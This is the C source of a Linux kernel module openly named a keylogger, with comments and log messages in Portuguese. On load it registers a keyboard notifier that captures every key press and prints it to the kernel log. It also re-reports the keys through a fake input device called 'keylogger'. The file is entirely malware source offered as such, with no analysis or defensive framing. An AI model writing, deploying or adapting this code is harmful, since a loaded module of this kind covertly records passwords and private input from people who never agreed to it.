#include <linux/module.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/input.h> 

#define BUFFSIZE 32

MODULE_LICENSE("GPL");

static struct input_dev *input_dev;

static int keylogger_notify(struct notifier_block *self, unsigned long event, void *data) {
    struct keyboard_notifier_param *param = data;

    if (event == KBD_KEYSYM && param->down) {
        input_report_key(input_dev, param->value, 1); // Tecla pressionada
        input_sync(input_dev);

        printk(KERN_INFO "%c\n", param->value);
    }

    return NOTIFY_OK;
}

static struct notifier_block keylogger_blk = {
    .notifier_call = keylogger_notify
};

static int start_keylogger(void){

    input_dev = input_allocate_device();
    if (!input_dev) {
        return -ENOMEM;
    }

    input_dev->name = "keylogger";
    set_bit(EV_KEY, input_dev->evbit);
    set_bit(KEY_RESERVED, input_dev->keybit); // Todas as teclas são consideradas reservadas

    if (input_register_device(input_dev)) {
        input_free_device(input_dev);
        return -ENOMEM;
    }

    return 0;
    
}

static void stop_keylogger(void){

    unregister_keyboard_notifier(&keylogger_blk);
    input_unregister_device(input_dev);

}

static int __init keylogger_init(void) {
    
    if(start_keylogger()){
        return -ENOMEM;
    }

    register_keyboard_notifier(&keylogger_blk);

    pr_info("Módulo Keylogger carregado\n");

    return 0;
}

static void __exit keylogger_exit(void) {

    stop_keylogger();
    
    pr_info("Módulo Keylogger descarregado\n");

}

module_init(keylogger_init);
module_exit(keylogger_exit);
